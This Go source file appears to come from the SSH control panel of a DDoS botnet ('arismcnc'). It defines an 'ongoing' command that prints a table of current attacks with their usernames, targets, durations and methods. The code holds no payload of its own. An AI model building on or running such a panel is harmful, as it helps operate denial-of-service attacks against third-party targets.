package cmds

import (
	"arismcnc/database"
	"arismcnc/utils"
	"fmt"
	"io"
	"strings"

	"github.com/gliderlabs/ssh"
)

// OngoingCommand example command, not restricted to admins
type OngoingCommand struct{}

func (c *OngoingCommand) Name() string {
	return "ongoing"
}

func (c *OngoingCommand) Execute(session ssh.Session, db *database.Database, args []string, output io.Writer) {
	currentAttacks := db.GetCurrentAttacks()

	if len(currentAttacks) == 0 {
		utils.SendMessage(session, "\u001B[91mNo ongoing attacks.\u001B[0m", true)
		return
	}

	// Show full table for everyone (admin and regular users)
	printFullTable(output, currentAttacks)
}

func printFullTable(output io.Writer, currentAttacks []database.CurrentAttack) {
	// Define column widths
	colWidths := []int{4, 14, 15, 10, 8}
	
	// Top border
	fmt.Fprint(output, " ╔")
	for i, width := range colWidths {
		fmt.Fprint(output, strings.Repeat("═", width))
		if i < len(colWidths)-1 {
			fmt.Fprint(output, "╤")
		}
	}
	fmt.Fprintln(output, "╗")

	// Header
	fmt.Fprintf(output, " ║ %-*s │ %-*s │ %-*s │ %-*s │ %-*s ║\n",
		colWidths[0]-2, "#",
		colWidths[1]-2, "Username",
		colWidths[2]-2, "Target",
		colWidths[3]-2, "Duration",
		colWidths[4]-2, "Method")

	// Header separator
	fmt.Fprint(output, " ╟")
	for i, width := range colWidths {
		fmt.Fprint(output, strings.Repeat("─", width))
		if i < len(colWidths)-1 {
			fmt.Fprint(output, "┼")
		}
	}
	fmt.Fprintln(output, "╢")

	// Data rows
	for index, attack := range currentAttacks {
		username := truncate(attack.Username, colWidths[1]-2)
		target := truncate(attack.Target, colWidths[2]-2)
		method := truncate(attack.Method, colWidths[4]-2)
		
		fmt.Fprintf(output, " ║ %-*d │ %-*s │ %-*s │ %-*d │ %-*s ║\n",
			colWidths[0]-2, index+1,
			colWidths[1]-2, username,
			colWidths[2]-2, target,
			colWidths[3]-2, attack.Duration,
			colWidths[4]-2, method)
	}

	// Bottom border
	fmt.Fprint(output, " ╚")
	for i, width := range colWidths {
		fmt.Fprint(output, strings.Repeat("═", width))
		if i < len(colWidths)-1 {
			fmt.Fprint(output, "╧")
		}
	}
	fmt.Fprintln(output, "╝")
}

// truncate helper function to limit string length
func truncate(s string, maxLen int) string {
	if len(s) > maxLen {
		return s[:maxLen-3] + "..."
	}
	return s
}

func (c *OngoingCommand) AdminOnly() bool {
	return false
}

// Aliases for OngoingCommand
func (c *OngoingCommand) Aliases() []string {
	return []string{"ongoing", "attacks"}
}

// Register OngoingCommand in the CommandMap
func init() {
	CommandMap["ongoing"] = &OngoingCommand{}
}